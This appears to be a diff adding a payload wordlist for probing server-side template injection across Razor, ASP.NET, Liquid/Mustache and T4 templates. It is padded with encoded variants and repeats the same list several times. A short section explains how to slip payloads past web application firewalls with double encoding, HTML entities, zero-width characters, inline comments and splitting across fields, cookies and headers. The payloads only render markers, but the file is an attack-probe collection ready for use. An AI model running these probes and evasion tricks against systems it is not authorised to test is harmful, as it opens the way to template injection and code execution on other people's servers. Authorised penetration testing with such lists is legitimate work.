@@ -1,0 +1,178 @@
+@("SSTI_OK")
+@('SSTI_OK')
+@("SSTI" + "_" + "OK")
+@{ var s="SSTI"; }@s + "_OK"
+@((7*7))
+@{ Response.Write("SSTI_OK"); }
+@ /* comment */ ( "SSTI_OK" )
+@ ( "SSTI_OK" )
+%40%28%22SSTI_OK%22%29                # URL-encoded: @("SSTI_OK")
+&#64;("SSTI_OK")                     # HTML-entity for @
+@\u0028\u0022SSTI_OK\u0022\u0029     # using unicode escapes (where accepted)
+%2540%2528%2522SSTI_OK%2522%2529    # double-encoded variant
+<%= "SSTI_OK" %>
+<% Response.Write("SSTI_OK"); %>
+<%= "SSTI" + "_" + "OK" %>
+<%--comment--%><%= "SSTI_OK" %>
+<% =    "SSTI_OK"    %>              # spacing/whitespace evasion
+<%= (char)83 + (char)83 + (char)84 + (char)73 + "_" + "OK" %>
+%3C%25%3D%20%22SSTI_OK%22%20%25%3E    # URL-encoded <%= "SSTI_OK" %>
+%253C%2525%253D%2520%2522SSTI_OK%2522%2520%2525%253E   # double-encoded
+&#60;%=%20%22SSTI_OK%22%20%25%3E     # HTML-entity-ish variants to try
+{{ "SSTI_OK" }}
+{{ "SSTI" | append: "_OK" }}
+{{ 7 | times: 7 }}         # 7 * 7 => 49 (Liquid-style)
+{{7*7}}                    # other engines may accept direct arithmetic
+&#123;&#123; "SSTI_OK" &#125;&#125;    # entity-encoded braces
+{{ "SSTI" }}{{ "_OK" }}              # split-concatenate
+%7B%7B%20%22SSTI_OK%22%20%7D%7D       # URL-encoded braces
+{ "bio": "@(\"SSTI_OK\")" }
+{ "bio": "%40(%22SSTI_OK%22)" }       # JSON value with URL-encoded inside
+bio=@("SSTI_OK")
+bio=%40%28%22SSTI_OK%22%29           # URL-encoded form value
+Cookie: bio=%40%28%22SSTI_OK%22%29
+X-User-Template: @("SSTI_OK")        # try in custom headers
+----
+URL-encode common payloads:
+  @("SSTI_OK")  =>  %40%28%22SSTI_OK%22%29
+
+Double-encode if single-decode WAF:
+  %2540%2528%2522SSTI_OK%2522%2529
+
+HTML entities:
+  @ => &#64;
+  { => &#123;  } => &#125;
+
+Whitespace / comment obfuscation:
+  @ /*x*/ ( "SSTI_OK" )
+  <%=    "SSTI_OK"    %>
+
+Split & reassemble (if you control multiple fields):
+  fieldA = @("SSTI")
+  fieldB = +"_OK"
+  (server concatenation may produce SSTI_OK)
+----
+@("SSTI_OK")
+@('SSTI_OK')
+@("SSTI" + "_" + "OK")
+@{ var s="SSTI"; }@s + "_OK"
+@((7*7))
+@{ Response.Write("SSTI_OK"); }
+%40%28%22SSTI_OK%22%29
+%2540%2528%2522SSTI_OK%2522%2529
+&#64;("SSTI_OK")
+<%= "SSTI_OK" %>
+<% Response.Write("SSTI_OK"); %>
+<%= "SSTI" + "_" + "OK" %>
+%3C%25%3D%20%22SSTI_OK%22%20%25%3E
+%253C%2525%253D%2520%2522SSTI_OK%2522%2520%2525%253E
+{{ "SSTI_OK" }}
+{{ "SSTI" | append: "_OK" }}
+{{ 7 | times: 7 }}
+%7B%7B%20%22SSTI_OK%22%20%7D%7D
+bio=@("SSTI_OK")
+bio=%40%28%22SSTI_OK%22%29
+Cookie: bio=%40%28%22SSTI_OK%22%29
+X-User-Template: @("SSTI_OK")
+@\u0028\u0022SSTI_OK\u0022\u0029
+@ /* comment */ ( "SSTI_OK" )
+<%--comment--%><%= "SSTI_OK" %>
+@/*x*/("SSTI_OK")        # Razor: comment between @ and (
+@ ( "SSTI_OK" )          # Extra spaces
+<%--x--%><%= "SSTI_OK" %> # ASPX with server comment
+{{ /*x*/ "SSTI_OK" }}    # Mustache/Liquid (if engine ignores C-style comment)
+&#64;("SSTI_OK")          # @ -> &#64;
+%40%28%22SSTI_OK%22%29   # URL-encoded @("SSTI_OK")
+%2540%2528%2522SSTI_OK%2522%2529  # double-encoded variant
+&#123;&#123;"SSTI_OK"&#125;&#125; # {{ "SSTI_OK" }} with entities
+@(((char)83).ToString()+((char)83).ToString()+((char)84).ToString()+((char)73).ToString()+"_OK")
+<%= (char)83 + (char)83 + (char)84 + (char)73 + "_" + "OK" %>
+@‌("SSTI_OK")   # @ + ZWNJ + ( ... )  (looks normal in browser but breaks WAF)
+{‌{ "SSTI_OK" }‌} # zero-width between braces
+@("SSTI_OK"){{"SSTI_OK"}}<%= "SSTI_OK" %>
+X-User-Template: %40%28%22SSTI_OK%22%29
+Cookie: bio=%40%28%22SSTI_OK%22%29
+{{ 'SSTI_OK' }}      # basic
+{{ 7 * 7 }}          # renders 49
+{{ "SSTI" | append: "_OK" }}
+{{ 7 | times: 7 }}   # 49 in many Liquid variants
+@DateTime.Now.Year
+@("SSTI_OK")
+&#64;\u200B/*x*/( "SSTI_OK" )
+%40/*x*/%28%22SSTI_OK%22%29
+
+@/*x*/("SSTI_OK")
+&#64;("SSTI_OK")
+%40%28%22SSTI_OK%22%29
+%2540%2528%2522SSTI_OK%2522%2529
+@‌("SSTI_OK")                # @ + zero-width (U+200C)
+@(((char)83).ToString()+"_OK")
+{{ "SSTI" | append: "_OK" }}
+{{ 7 * 7 }}
+%7B%7B%20%22SSTI_OK%22%20%7D%7D
+template%40%28%22SSTI_OK%22%29.html    # filename test
+X-User-Template: %40%28%22SSTI_OK%22%29
+FieldA=@("SSTI")   FieldB=_OK")        # split-token (send across two params)
+&#123;&#123;"SSTI_OK"&#125;&#125;
+%3C%25%3D%20%22SSTI_OK%22%20%25%3E
+%2540%u200B%28%22SSTI_OK%22%29        # combined double-encoding + zero-width
+
+------------
+
+@(("SSTI_OK"))
+@("SSTI_OK")
+@((7*7))
+@DateTime.Now.Year
+@{ Response.Write("SSTI_OK"); }
+@{ var s="SSTI_OK"; }@s
+@ /* x */ ( "SSTI_OK" )
+<%= "SSTI_OK" %>
+<% Response.Write("SSTI_OK"); %>
+<% = "SSTI_OK" %>
+<%--comment--%><%= "SSTI_OK" %>
+<%= (7*7) %>
+{{ "SSTI_OK" }}
+{{ "SSTI" | append: "_OK" }}
+{{ 7 | times: 7 }}
+{{7*7}}
+{{ part1 }}{{ part2 }}
+@("SSTI_OK")
+@('SSTI_OK')
+@("SSTI" + "_" + "OK")
+@{ var s="SSTI"; }@s + "_OK"
+@((7*7))
+@{ Response.Write("SSTI_OK"); }
+@ /* comment */ ( "SSTI_OK" )
+@ ( "SSTI_OK" )
+<%= "SSTI_OK" %>
+<% Response.Write("SSTI_OK"); %>
+<%= "SSTI" + "_" + "OK" %>
+<%--comment--%><%= "SSTI_OK" %>
+<%= (7*7) %>
+{{ "SSTI_OK" }}
+{{ "SSTI" | append: "_OK" }}
+{{ 7 | times: 7 }}
+{{7*7}}
+<#= "SSTI_OK" #>
+<#= 7*7 #>
+%40%28%22SSTI_OK%22%29
+%2540%2528%2522SSTI_OK%2522%2529
+&#64;("SSTI_OK")
+\u0040("SSTI_OK")
+%3C%25%3D%20%22SSTI_OK%22%20%25%3E
+%253C%2525%253D%2520%2522SSTI_OK%2522%2520%2525%253E
+%7B%7B%20%22SSTI_OK%22%20%7D%7D
+&#123;&#123;"SSTI_OK"&#125;&#125;
+@(((char)83).ToString()+((char)83).ToString()+((char)84).ToString()+((char)73).ToString()+"_OK")
+<%= (char)83 + (char)83 + (char)84 + (char)73 + "_" + "OK" %>
+@("SSTI" + "_" + "OK")
+FieldA=@("SSTI")      # send across two params: FieldB=_OK")
+@‌("SSTI_OK")         # zero-width (U+200C) between @ and (
+&#64;\u200B("SSTI_OK") # entity + zero-width combos
+@/*x*/("SSTI_OK")
+<%--x--%><%= "SSTI_OK" %>
+%2540%2528%2522SSTI_OK%2522%2529
+%40%2F*%78*%2F%28%22SSTI_OK%22%29   # @/*x*/("SSTI_OK") URL-encoded
+%40\u200B%28%22SSTI_OK%22%29
+%3C%25%3D%20%22SSTI_OK%22%20%25%3E
+%7B%7B%22SSTI_OK%22%7D%7D
